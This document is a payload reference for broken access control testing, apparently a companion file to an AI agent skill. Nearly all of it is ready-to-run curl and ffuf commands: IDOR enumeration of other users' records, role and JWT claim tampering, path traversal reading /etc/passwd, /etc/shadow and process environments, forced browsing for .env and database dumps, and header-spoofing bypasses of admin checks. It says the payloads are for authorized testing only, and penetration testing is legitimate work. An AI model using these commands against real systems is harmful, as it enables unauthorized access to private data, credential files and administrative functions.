# Broken Access Control Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for access control testing by attack type.
> Purpose: Quickly find request construction patterns for IDOR, privilege escalation, path traversal, forced browsing, and other attacks.
> All payloads are for authorized security testing only.

---

## Index

1. [IDOR (Insecure Direct Object Reference)](#1-idor-insecure-direct-object-reference)
2. [Privilege Escalation](#2-privilege-escalation)
3. [Path Traversal](#3-path-traversal)
4. [Forced Browsing](#4-forced-browsing)
5. [Parameter Tampering](#5-parameter-tampering)
6. [HTTP Method Tampering](#6-http-method-tampering)
7. [Header Spoofing Bypass](#7-header-spoofing-bypass)

---

## 1. IDOR (Insecure Direct Object Reference)

### Integer ID Replacement

```bash
# Access User_B's resource using User_A's credentials
curl -s -H "Cookie: session=USER_A_TOKEN" \
     http://target/api/v1/users/123/profile
curl -s -H "Cookie: session=USER_A_TOKEN" \
     http://target/api/v1/users/456/profile
# Both return 200 -> IDOR confirmed
```

### ffuf Batch IDOR

```bash
# Integer ID range
ffuf -u "http://target/api/v1/users/FUZZ/profile" \
     -w <(seq 1 1000) \
     -H "Cookie: session=USER_A_TOKEN" \
     -fc 403,404 -mc 200

# POST request IDOR
ffuf -u "http://target/api/v1/orders" \
     -X POST -H "Content-Type: application/json" \
     -H "Cookie: session=USER_A_TOKEN" \
     -d '{"user_id": FUZZ, "action": "view"}' \
     -w <(seq 1 500) -fc 403,404
```

### UUID-Based IDOR

```bash
# Collect UUIDs from API responses
curl -s -H "Cookie: session=TOKEN" \
     http://target/api/v1/users/me/posts | jq '.[].author_id'

# Batch test
for uuid in $(cat collected_uuids.txt); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
          -H "Cookie: session=OTHER_TOKEN" \
          "http://target/api/v1/documents/$uuid")
    [ "$code" = "200" ] && echo "[+] IDOR: $uuid"
done
```

### Multi-Level IDOR

```bash
# Organization -> Project -> Document three-level
curl -s -H "Cookie: session=TOKEN" \
     http://target/api/v1/orgs/1/projects/5/docs/42
# Replace IDs layer by layer, testing authorization checks at each level
```

---

## 2. Privilege Escalation

### Vertical Privilege Escalation -- Admin Endpoint Discovery

```bash
ADMIN_ENDPOINTS=("/admin" "/administrator" "/manage" "/console" "/dashboard"
  "/admin/users" "/admin/settings" "/admin/config" "/admin/logs"
  "/api/v1/admin/users" "/api/internal/debug")

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -H "Cookie: session=$USER_TOKEN" \
             "http://target$endpoint")
    if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ] && [ "$STATUS" != "404" ]; then
        echo "[+] $endpoint -> $STATUS (possible privilege escalation)"
    fi
done
```

### Role Parameter Tampering

```bash
# Inject role via JSON body
curl -s -H "Cookie: session=$USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","user_id":123}' \
     "http://target/api/v1/users/update"

# Cookie/JWT claims tampering
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin
```

---

## 3. Path Traversal

### Basic Path Traversal

```bash
curl "http://target/file?name=../../../etc/passwd"
curl "http://target/file?name=../../etc/shadow"
curl "http://target/file?name=../../../proc/self/environ"
```

### URL Encoding Bypass

```bash
# Single encoding
curl "http://target/file?name=..%2f..%2f..%2fetc/passwd"

# Double encoding
curl "http://target/file?name=..%252f..%252f..%252fetc/passwd"
curl --path-as-is "http://target/..%252f..%252f..%252fetc/passwd"
```

### Unicode/Special Encoding Bypass

```bash
curl "http://target/file?name=..%c0%ae%c0%ae%c0%afetc/passwd"
curl "http://target/file?name=..\\..\\..\\windows\\win.ini"
curl "http://target/file?name=....//....//....//etc/passwd"
```

### ffuf Batch Path Traversal

```bash
ffuf -u "http://target/file?name=FUZZ" \
     -w path_traversal_payloads.txt \
     -fc 403,404 -mc 200 -fs 0
```

---

## 4. Forced Browsing

### Sensitive Directory Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://target/FUZZ -mc 200,401,403

# Backup/sensitive files
for file in backup.sql users.csv .env .git/HEAD config.yml dump.sql; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://target/$file")
    [ "$code" = "200" ] && echo "[+] Found: /$file"
done
```

### API Version Discovery

```bash
for ver in v1 v2 v3 api rest internal admin staging beta; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
           -H "Cookie: session=$USER_TOKEN" \
           "http://target/$ver/admin/users")
    [ "$code" != "404" ] && echo "[+] /$ver/admin/users -> $code"
done
```

---

## 5. Parameter Tampering

### Case Obfuscation

```bash
curl "http://target/Admin/Dashboard"
curl "http://target/ADMIN/DELETE_USER"
curl "http://target/aDmIn/dElEtE"
```

### URL Encoding and Path Parameter Obfuscation

```bash
curl "http://target/%61dmin/%64elete"         # /admin/delete
curl "http://target/admin;/dashboard"
curl "http://target/admin/./dashboard"
curl --path-as-is "http://target/admin%00/dashboard"
curl "http://target/admin%0a/dashboard"
curl "http://target/admin%23/dashboard"
```

### JSON Parameter Injection

```bash
# Add extra parameters
curl -s -X PATCH http://target/api/v1/users/123 \
     -H "Cookie: session=$TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","role":"admin","is_admin":true}'
```

---

## 6. HTTP Method Tampering

```bash
TARGET_URL="http://target/admin/delete_user?id=1"
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -X "$method" -H "Cookie: session=$USER_TOKEN" \
             "$TARGET_URL")
    echo "[$method] -> $STATUS"
done
# Common bypass: GET is blocked but PUT/DELETE are not
```

---

## 7. Header Spoofing Bypass

### X-Original-URL Bypass

```bash
# Some frameworks (e.g. Spring) support this header to override routing
curl -H "X-Original-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"

curl -H "X-Rewrite-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"
```

### IP Spoofing to Bypass Internal Access Controls

```bash
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/admin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: localhost" \
     "http://target/admin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Originating-IP: 127.0.0.1" \
     -H "X-Client-IP: 127.0.0.1" \
     "http://target/admin/debug"
```
